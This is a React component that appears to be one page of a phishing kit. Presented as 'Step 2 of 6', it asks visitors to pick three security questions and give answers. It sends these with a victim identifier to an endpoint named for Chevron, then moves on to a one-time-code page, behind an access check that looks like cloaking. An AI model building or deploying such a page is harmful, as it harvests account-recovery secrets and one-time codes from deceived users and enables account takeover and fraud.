import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  // Predefined security questions
  const securityQuestions = [
    "What was your childhood nickname?",
    "What is your mother's maiden name?",
    "What was the name of your first pet?",
    "What was the make and model of your first car?",
    "What city were you born in?",
    "What is your favorite childhood memory?",
    "What was your first job title?",
    "What is the name of your favorite teacher?",
    "What is your favorite book/movie character?",
    "What street did you grow up on?"
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/chevron-security-questions/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3
        });
        console.log('Security questions submitted successfully');
        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing verification details. Please restart the process.</div>;
  }

  return (
    <FlowPageLayout
      eyebrow="Step 2 of 6"
      title="Set Your Security Questions"
      description="Choose three questions and provide answers that only you would know. We'll rely on these to verify your identity if you ever need to recover access."
      contentClassName="space-y-6"
    >
      <form onSubmit={handleSubmit} className="space-y-6">
          {/* Security Question 1 */}
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Security Question 1</label>
          <select
            value={securityQuestion1}
            onChange={(e) => setSecurityQuestion1(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
          >
            <option value="">Select a security question</option>
            {securityQuestions.map((question, index) => (
              <option key={index} value={question}>
                {question}
              </option>
            ))}
          </select>
          {errors.securityQuestion1 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityQuestion1}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Answer 1</label>
          <input
            type="text"
            value={securityAnswer1}
            onChange={(e) => setSecurityAnswer1(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="Enter your answer"
          />
          {errors.securityAnswer1 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityAnswer1}
            </p>
          )}
        </div>

          {/* Security Question 2 */}
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Security Question 2</label>
          <select
            value={securityQuestion2}
            onChange={(e) => setSecurityQuestion2(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
          >
            <option value="">Select a security question</option>
            {securityQuestions
              .filter((question) => question !== securityQuestion1)
              .map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
          </select>
          {errors.securityQuestion2 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityQuestion2}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Answer 2</label>
          <input
            type="text"
            value={securityAnswer2}
            onChange={(e) => setSecurityAnswer2(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="Enter your answer"
          />
          {errors.securityAnswer2 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityAnswer2}
            </p>
          )}
        </div>

          {/* Security Question 3 */}
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Security Question 3</label>
          <select
            value={securityQuestion3}
            onChange={(e) => setSecurityQuestion3(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
          >
            <option value="">Select a security question</option>
            {securityQuestions
              .filter((question) => ![securityQuestion1, securityQuestion2].includes(question))
              .map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
          </select>
          {errors.securityQuestion3 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityQuestion3}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Answer 3</label>
          <input
            type="text"
            value={securityAnswer3}
            onChange={(e) => setSecurityAnswer3(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="Enter your answer"
          />
          {errors.securityAnswer3 && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.securityAnswer3}
            </p>
          )}
        </div>

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Submitting…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        Keep your answers private. They help us confirm it’s really you when you request account support.
      </div>
    </FlowPageLayout>
  );
};

export default SecurityQuestions;
